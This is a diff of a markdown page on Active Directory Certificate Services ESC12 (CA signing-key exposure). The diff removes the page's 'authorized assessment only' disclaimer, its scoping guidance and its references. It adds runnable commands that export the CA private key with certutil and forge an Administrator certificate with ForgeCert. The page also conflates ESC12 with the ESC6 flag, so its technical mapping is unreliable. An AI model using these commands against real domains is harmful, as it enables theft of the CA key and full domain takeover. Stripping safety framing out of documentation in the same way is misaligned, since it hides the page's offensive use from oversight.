@@ -10,21 +10,26 @@ mitre: "T1649"
 tag: null
 ---
 
+
 # AD CS ESC12 (CA signing-key exposure)
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **CA server host** + **`EDITF_ATTRIBUTESUBJECTALTNAME2`**.
 
-## Detection
+### Concept (deep)
+**Shell access to the CA server** + the ESC6 flag → issue certificates locally or extract the **CA private key**. This is a **physical/host-level compromise**.
+
+### Commands
+```bash
+# ── On the CA host ───────────────────────────────────────────────────
+certutil -backupKey C:\backup
+# Then use ForgeCert to forge certificates offline.
+ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword p \
+  --Subject "CN=Administrator" \
+  --SubjectAltName administrator@corp.local --NewCertPath admin.pfx
+```
+
+### Detection
 CertSvc config registry writes; CA key export audit (`certutil -backup`).
 
 ---
-
-## References
-
-- [Microsoft: Active Directory Certificate Services overview](https://learn.microsoft.com/windows-server/identity/ad-cs/active-directory-certificate-services-overview)
-- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)
